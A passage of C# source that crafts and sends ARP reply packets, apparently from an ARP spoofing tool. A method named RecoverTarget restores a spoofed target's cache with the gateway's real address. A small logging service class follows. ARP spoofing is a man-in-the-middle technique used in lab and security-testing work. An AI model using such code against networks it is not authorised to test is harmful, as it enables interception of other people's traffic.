                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[4], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[5], System.Globalization.NumberStyles.HexNumber))
                        }.AsReadOnly(),
                    SenderProtocolAddress = new byte[]
                        {
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[0])),
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[1])),
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[2])),
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[3]))
                        }.AsReadOnly(),
                    TargetHardwareAddress = new byte[]
                        {
                            Convert.ToByte(Int32.Parse(mac.Split(':')[0], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(mac.Split(':')[1], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(mac.Split(':')[2], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(mac.Split(':')[3], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(mac.Split(':')[4], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(mac.Split(':')[5], System.Globalization.NumberStyles.HexNumber))
                        }.AsReadOnly(),
                    TargetProtocolAddress = new byte[]
                        {
                            Convert.ToByte(Convert.ToInt32(IP.ToString().Split('.')[0])),
                            Convert.ToByte(Convert.ToInt32(IP.ToString().Split('.')[1])),
                            Convert.ToByte(Convert.ToInt32(IP.ToString().Split('.')[2])),
                            Convert.ToByte(Convert.ToInt32(IP.ToString().Split('.')[3])),
                        }.AsReadOnly()
                };

                PacketBuilder builder = new PacketBuilder(ethernetLayer, arpLayer);
                communicator.SendPacket(builder.Build(DateTime.Now));
            }
        }

        private void RecoverTarget(string spoofingTargetMac, string spoofingTargetIP)
        {
            using (PacketCommunicator communicator = selectedDevice.Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000))
            {
                EthernetLayer ethernetLayer = new EthernetLayer
                {
                    Source = new MacAddress(mac),
                    Destination = new MacAddress(spoofingTargetMac),
                    EtherType = EthernetType.None
                };

                ArpLayer arpLayer = new ArpLayer
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = ArpOperation.Reply,
                    SenderHardwareAddress = new byte[]
                        {
                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[0], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[1], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[2], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[3], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[4], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(gatewayMacAddress.Split(':')[5], System.Globalization.NumberStyles.HexNumber))
                        }.AsReadOnly(),
                    SenderProtocolAddress = new byte[]
                        {
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[0])),
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[1])),
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[2])),
                            Convert.ToByte(Convert.ToInt32(gatewayIPAddress.Split('.')[3]))
                        }.AsReadOnly(),
                    TargetHardwareAddress = new byte[]
                        {
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[0], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[1], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[2], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[3], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[4], System.Globalization.NumberStyles.HexNumber)),
                            Convert.ToByte(Int32.Parse(spoofingTargetMac.Split(':')[5], System.Globalization.NumberStyles.HexNumber))
                        }.AsReadOnly(),
                    TargetProtocolAddress = new byte[]
                        {
                            Convert.ToByte(Convert.ToInt32(spoofingTargetIP.Split('.')[0])),
                            Convert.ToByte(Convert.ToInt32(spoofingTargetIP.Split('.')[1])),
                            Convert.ToByte(Convert.ToInt32(spoofingTargetIP.Split('.')[2])),
                            Convert.ToByte(Convert.ToInt32(spoofingTargetIP.Split('.')[3])),
                        }.AsReadOnly()
                };

                PacketBuilder builder = new PacketBuilder(ethernetLayer, arpLayer);
                communicator.SendPacket(builder.Build(DateTime.Now));
            }
        }
    }

    public class Logging : ServiceBase
    {
        private string pas;

        public Logging() { }

        protected override void preExecute()
        {
            Console.WriteLine("PreExecute: Handling params...");
            pas = "";

            foreach (string s in Params)
                pas += s + " ";
        }

        protected override void onExecute()
        {
            Console.WriteLine("OnExecute: Executing Service...");
            Console.WriteLine("Logging Run with Params: " + pas);
        }

        protected override void postExecute()
        {
            Console.WriteLine("PostExecute: Seting Result...");
            Result = "Exected.";
        }
    }
}
